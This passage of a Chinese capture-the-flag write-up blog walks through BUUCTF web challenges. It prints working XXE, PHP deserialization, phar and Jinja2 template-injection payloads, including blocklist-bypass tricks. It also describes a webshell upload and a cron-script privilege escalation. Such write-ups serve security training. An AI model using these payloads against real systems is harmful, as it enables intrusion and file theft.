class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> code = document.getElementById(<span class="string">"vcode"</span>).value;</span><br><span class="line">  <span class="keyword">if</span> (code != <span class="string">""</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(hex_md5(code) == <span class="string">"0cd4da0223c0b280829dc3ea458d655c"</span>)&#123;</span><br><span class="line">      alert(<span class="string">"您通过了验证！"</span>);</span><br><span class="line">      window.location = <span class="string">"./flag.php"</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      alert(<span class="string">"你的授权码不正确！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    alert(<span class="string">"请输入授权码"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改请求数据包头部X-Forwarded-For:127.0.0.1</p><h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>读取源码，发现file协议读没用，换php协议读</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY penson SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php"</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>没发现什么<br>打内网,先读取/etc/hosts，我这里是没发现ip，看网上的writeup是存在个ip地址，爆破一下c端地址，其中访问一个ip地址即可得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY penson SYSTEM <span class="string">"http://173.10.47.11"</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>/time.php?source=<br>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.php?data=O:8:<span class="string">"HelloPhp"</span>:2:&#123;s:1:<span class="string">"a"</span>;s:15:<span class="string">"eval(<span class="variable">$_GET</span>[y]);"</span>;s:1:<span class="string">"b"</span>;s:6:<span class="string">"assert"</span>;&#125;&amp;y=phpinfo();</span><br></pre></td></tr></table></figure><h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">$content = uniqid().$random;</span><br><span class="line"><span class="keyword">return</span> sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ssi注入漏洞：<a href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener">https://blog.csdn.net/qq_40657585/article/details/84260844</a><br><img src="../../images/ctf/buuctf/21.jpg" alt=""></p><h1 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h1><p>/.git/源码泄露<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'yds_is_so_beautiful'</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure><p>反序列化之PHP原生类的利用:<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a><br><img src="../../images/ctf/buuctf/22.jpg" alt=""></p><h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p>jwt 弱秘钥 ，pickle反序列化漏洞  </p><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>这里算是学到一个知识点，嵌套定义一个类，就可以调用<code>__construct()</code>.    </p><p>思路如下：     </p><p>1.调用include()函数，让Test类中的属性p等于Modifier这个类，从而触发<code>__get()</code>魔术方法。将Modifier这个类变成一个函数，从而调用<code>__invoke()</code>方法，进而调用include()函数</p><p>2.让source 等于对象，进而触发<code>__toString</code>方法，输出内容</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span>  $var=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>存在任意文件下载</p><p>思路如下:</p><p>上传一个phar文件，后缀为图片的格式<br>然后在delete.php中访问它，以phar://test.jpg的形式，此时会调用file-&gt;open()中的file_exists()会触发反序列化，（此时file_exists()返回的是false）<br>此时只有user的<code>__descruct</code>会调用close()函数，但是没有回显功能，我们只能找一个有回显的地方进行序列化<br>我们观察到FileList类的<code>__descruct</code>有echo函数，输出$table，而$table的内容来自$result，我们再来看一下<code>__call</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>__call</code>函数是指当调用类不存在的方法时就会调用<code>__call</code>函数<br>其中$func就是指我们调用的不存在方法，而$args是指我们的参数，<br>通过代码我们知道假如我们调用close()方法，那么最后会调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file-&gt;$func()</span><br></pre></td></tr></table></figure><p>即$file-&gt;close()，并且存入$result中，那么file_get_contents的内容就能回显出来了~~</p><p>最后的payload为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db =(<span class="keyword">new</span> FileList());</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后再说一下，为什么我们要通过delete.php触发phar反序列化，而不是通过download.php，两者都会调用file_exists()，那是因为download.php有base_dir限制，我们不能读出在/目录下的文件</p><h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>ssti模板注入<br>读取app.py文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'app.py'</span>,<span class="string">'r'</span>).<span class="built_in">read</span>() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>得知waf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(str)</span>:</span> </span><br><span class="line">  black_list = [ &amp;</span><br><span class="line">    <span class="comment">#34;flag&amp;# 34;, &amp; #34;os&amp;# 34;, &amp; #34;system&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;popen&amp;# 34;, &amp; #34;import&amp;# 34;, &amp; #34;eval&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;chr&amp;# 34;, &amp; #34;request&amp;# 34;, &amp; #34;subprocess&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;commands&amp;# 34;, &amp; #34;socket&amp;# 34;, &amp; #34;hex&amp;# 34;, &amp;</span></span><br><span class="line">    <span class="comment">#34;base64&amp;# 34;, &amp; #34;*&amp;# 34;, &amp; #34;?&amp;# 34;</span></span><br><span class="line">]</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> black_list: </span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">in</span> str.lower(): </span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>@ app.route( &amp;<span class="comment">#39;/hint&amp;# 39;, methods = [ &amp; #39;GET&amp;# 39;])</span></span><br></pre></td></tr></table></figure><p>字符串拼接绕过，listdir列出文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__imp'</span>+<span class="string">'ort__'</span>](<span class="string">'o'</span>+<span class="string">'s'</span>).listdir(<span class="string">'/'</span>)&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>倒序绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read()&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>拼接绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'/this_is_the_fl'</span>+<span class="string">'ag.txt'</span>,<span class="string">'r'</span>).read()&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h1 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h1><p>后台admin.php<br>账户密码：admin shopxo</p><p>接下来就在应用中心里的应用商店找到主题，然后下载默认主题。<br>在_static_里面加上一个test.php，这里面就是我们加入的一句话了，加个phpinfo（）可以方便确认马到底有没有穿上去。在/public/static/index/default/test.php ，打开验证一下。<br>连接成功后发现目录里有flag和flag.hint<br>打开flag里面是假flag ，然后尝试的打开root目录，发现权限不够</p><p>打开这个标红的auto.sh，发现他60秒运行一次makeflaghint.py的脚本，makeflaghint.py有权限修改，添加<code>os.system(&quot;cat /root/flag &gt; /1.txt&quot;)</code>,过一分钟后即可得flag     </p><h1 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h1><p>smarty模板注入<br><img src="../../images/ctf/buuctf/23.jpg" alt=""><br><img src="../../images/ctf/buuctf/24.jpg" alt=""></p><h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">PHP mt_rand安全杂谈及应用场景详解</a><br>check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">iNoUoNVRYN</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>构造取反连接蚁剑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 